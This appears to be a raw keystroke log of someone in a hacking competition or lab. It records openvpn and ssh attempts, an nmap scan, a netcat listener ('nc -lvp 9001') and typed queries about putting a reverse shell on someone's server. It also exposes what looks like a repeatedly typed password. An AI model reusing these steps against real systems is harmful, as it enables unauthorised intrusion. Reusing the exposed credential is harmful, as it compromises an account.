2023-02-23 15:52:22-0500	<LShft>EZl<LShft>Yjlw<LShft>Mj<LShft>M=<Left><Left><Left><Left><Left><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>cybermayhem<LShft>_blueridge01<LShft>_12183.ovpn<BckSp><BckSp><BckSp><BckSp><BckSp>	cybermayhem_blueridge01_12183	cybermayhem_blueridge01_1218	0.38666666666666666		
2023-02-23 15:59:20-0500	<Enter>hackthe<BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>thefirstruleofcst	thefirstruleofcst	thefirstruleofcs	0.3617021276595745		
2023-02-23 15:59:38-0500	<Enter><Up>			0.0		
2023-02-23 15:59:45-0500	<Enter>thefirstruleofcst	thefirstruleofcst	thefirstruleofcs	1.0		
2023-02-23 15:59:56-0500	<Enter>clear<BckSp><BckSp><BckSp><BckSp><BckSp><Up><Up><Down><Up>			0.0		
2023-02-23 16:01:06-0500	<Enter><Up>			0.0		
2023-02-23 16:02:47-0500	<Enter><Up><BckSp><BckSp><#+25><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><LCtrl>s	s		0.05263157894736842		
2023-02-23 16:03:26-0500	<Enter><Up><BckSp><LCtrl>ssudo p<BckSp>openvpn cybermay<BckSp><BckSp><BckSp><Tab>	ssudo openvpn cyber	ssudo	0.6129032258064516		
2023-02-23 16:03:57-0500	<Enter>thefirstruleofsc<BckSp><BckSp>cst	thefirstruleofcst	thefirstruleofcs	0.8095238095238095		
2023-02-23 16:04:03-0500	<Enter><LCtrl><LShft>++++<LCtrl><LShft>_-<BckSp><LCtrl>-<LMeta><Left><LMeta><Right><LCtrl><LShft><#+22><#+22><LCtrl>-<LCtrl>-<LMeta><Right>netcat <BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>nc <LCtrl><LShft>V	++++_-<#+22><#+22>-nc V	++++_-<#+22><#+22>-nc	0.39655172413793105		
2023-02-23 16:07:39-0500	<Enter>nc<BckSp><BckSp><BckSp>ls nc	ls nc	ls	0.5		
2023-02-23 16:07:49-0500	<Enter>ls netcat	ls netcat	ls	1.0		
2023-02-23 16:07:52-0500	<Enter>man nc	man nc	man	1.0		
2023-02-23 16:07:57-0500	<Enter><Down><#+20><Down><#+18><Down><#+20><Down><#+19><Down><#+23><Down><#+21>how to get on a server	<#+20><#+18><#+20><#+19><#+23><#+21>how to get on a server	<#+20><#+18><#+20><#+19><#+23><#+21>how	0.90625		
2023-02-23 16:08:35-0500	<Enter><BckSp><BckSp><#+7>erver	<#+7>erver	<#+7>erve	0.8333333333333334		
2023-02-23 16:08:54-0500	<Enter> through the terminal	 through the terminal		1.0		
2023-02-23 16:09:01-0500	<Enter>qqssh <LCtrl><LShft><LCtrl><LShft>V	qqssh V	qqssh	0.6363636363636364		
2023-02-23 16:09:10-0500	<Enter>ls<BckSp><BckSp>y	y		0.2		
2023-02-23 16:09:15-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:09:16-0500	<Enter>ls<BckSp><BckSp>123	123	12	0.42857142857142855		
2023-02-23 16:09:22-0500	<Enter>lkj<BckSp><BckSp> host	l host	l	0.6		
2023-02-23 16:10:21-0500	<Enter><LCtrl>zssh local ho<BckSp><BckSp><BckSp>host	zssh localhost	zssh	0.6666666666666666		
2023-02-23 16:10:32-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:10:35-0500	<Enter>how the box battlegrounds how to	how the box battlegrounds how to	how	1.0		
2023-02-23 16:10:52-0500	<Enter><LCtrl>c	c		0.5		
2023-02-23 16:12:03-0500	c<LCtrl>zclear	czclear	czclea	1.0		
2023-02-23 16:12:10-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:12:12-0500	<Enter>how to install a rever<BckSp>se<BckSp><BckSp>rse shell on <BckSp>to a ip address	how to install a reverse shell onto a ip address	how	0.8571428571428571		
2023-02-23 16:13:18-0500	<Enter>nc -lvp 9001	nc -lvp 9001	nc	1.0		
2023-02-23 16:14:05-0500	<Enter><LCtrl>znc -lvp <LCtrl><LShft>V	znc -lvp V	znc	0.7692307692307693		
2023-02-23 16:14:12-0500	<Enter>nc<BckSp><BckSp>what does nc -lvp do	what does nc -lvp do	what	0.8333333333333334		
2023-02-23 16:14:27-0500	<Enter><Up><Up> -p what port is is tcp on	 -p what port is is tcp on		0.9285714285714286		
2023-02-23 16:14:55-0500	<Enter>what port	what port	what	1.0		
2023-02-23 16:15:04-0500	<Enter>22	22	2	1.0		
2023-02-23 16:15:19-0500	<Enter><Up><Up><Down><BckSp><BckSp>80	80	8	0.2857142857142857		
2023-02-23 16:15:28-0500	<Enter>ping <LCtrl><LShft>V	ping V	ping	0.75		
2023-02-23 16:16:07-0500	<Enter><LCtrl>zhow to put a reverse shell on a server	zhow to put a reverse shell on a server	zhow	0.975		
2023-02-23 16:16:31-0500	<Enter>nmap -<LShft>Pn <LCtrl><LShft>V	nmap -Pn V	nmap	0.7692307692307693		
2023-02-23 16:16:48-0500	<Enter>nc -<BckSp><LCtrl><LShft>V -p 22	nc V -p 22	nc	0.7142857142857143		
2023-02-23 16:19:08-0500	<Enter>how do esnc work	how do esnc work	how	1.0		
2023-02-23 16:19:21-0500	<Enter><BckSp><BckSp><BckSp>n	n		0.25		
2023-02-23 16:19:26-0500	<Enter>command	command	comman	1.0		
2023-02-23 16:19:37-0500	<Enter>how to send a file to <BckSp><BckSp><BckSp>using nc to a <BckSp>n open o<BckSp>port	how to send a file using nc to an open port	how	0.8113207547169812		
2023-02-23 16:20:02-0500	<Enter>how to open a reveser shell on someon's ssh port	how to open a reveser shell on someon's ssh port	how	1.0		
2023-02-23 16:20:59-0500	<Enter>is port 22 an unfiltered port	is port 22 an unfiltered port	is	1.0		
2023-02-23 16:22:16-0500	<Enter><BckSp><BckSp>3000	3000	300	0.6666666666666666		
